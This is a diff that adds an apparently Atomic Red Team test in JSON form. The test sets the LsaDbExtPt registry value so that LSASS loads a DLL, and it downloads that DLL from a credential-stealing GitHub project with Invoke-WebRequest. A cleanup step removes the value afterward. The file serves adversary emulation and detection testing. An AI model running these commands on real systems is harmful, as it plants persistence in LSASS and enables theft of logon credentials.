@@ -1,0 +1,105 @@
+{
+  "id": "8ecef16d-d289-46b4-917b-0dba6dc81cf1",
+  "name": "Modify Registry to load Arbitrary DLL into LSASS - LsaDbExtPt",
+  "description": "The following Atomic will modify an undocumented registry key that may be abused to load a arbitrary DLL into LSASS. \n\nUpon execution, the registry key will be modified and a value will contain the path to the DLL. \nReference: https://blog.xpnsec.com/exploring-mimikatz-part-1/ and source https://github.com/oxfemale/LogonCredentialsSteal\nNote that if any LSA based protection is enabled, this will most likely not be successful with LSASS.exe loading the DLL.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "5c8fa905-d1b1-4b70-9b66-abdbd8ee5fb3",
+      "type": "execute-command",
+      "data": {
+        "command": "New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS -Name LsaDbExtPt -Value \"#{dll_path}\"\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "a9d8ff57-f032-4aa6-a516-87bd4b16072a",
+      "type": "execute-command",
+      "data": {
+        "command": "Remove-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\" -Name \"LsaDbExtPt\" -ErrorAction Ignore | Out-Null\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "b553be82-a14c-43ab-ad78-989283353eaf",
+      "name": "Check dependency 1/1",
+      "description": "lsass_lib.dll must exist on disk at specified location (#{dll_path})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{dll_path}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "e4509b92-b40a-413d-97a3-b867cd7f9102",
+      "name": "Resolve dependency 1/1",
+      "description": "lsass_lib.dll must exist on disk at specified location (#{dll_path})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/oxfemale/LogonCredentialsSteal/raw/53e74251f397ddeab2bd1348c3ff26d702cfd836/lsass_lib/x64/Release/lsass_lib.dll\" -UseBasicParsing -OutFile \"#{dll_path}\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "053675c1-b2da-44f1-af7e-0f61520e5ac3",
+      "name": "Re-check dependency 1/1",
+      "description": "lsass_lib.dll must exist on disk at specified location (#{dll_path})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{dll_path}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "5c8fa905-d1b1-4b70-9b66-abdbd8ee5fb3",
+      "p": "on-success",
+      "o": "a9d8ff57-f032-4aa6-a516-87bd4b16072a"
+    },
+    {
+      "s": "5c8fa905-d1b1-4b70-9b66-abdbd8ee5fb3",
+      "p": "on-failure",
+      "o": "a9d8ff57-f032-4aa6-a516-87bd4b16072a"
+    },
+    {
+      "s": "b553be82-a14c-43ab-ad78-989283353eaf",
+      "p": "on-success",
+      "o": "5c8fa905-d1b1-4b70-9b66-abdbd8ee5fb3"
+    },
+    {
+      "s": "b553be82-a14c-43ab-ad78-989283353eaf",
+      "p": "on-failure",
+      "o": "e4509b92-b40a-413d-97a3-b867cd7f9102"
+    },
+    {
+      "s": "e4509b92-b40a-413d-97a3-b867cd7f9102",
+      "p": "on-success",
+      "o": "053675c1-b2da-44f1-af7e-0f61520e5ac3"
+    },
+    {
+      "s": "053675c1-b2da-44f1-af7e-0f61520e5ac3",
+      "p": "on-failure",
+      "o": "5c8fa905-d1b1-4b70-9b66-abdbd8ee5fb3"
+    }
+  ],
+  "tags": [
+    "T1547.008",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "dll_path",
+      "type": "path",
+      "description": "Module to be loaded into LSASS",
+      "value": "PathToAtomicsFolder\\..\\ExternalPayloads\\lsass_lib.dll"
+    }
+  ]
+}
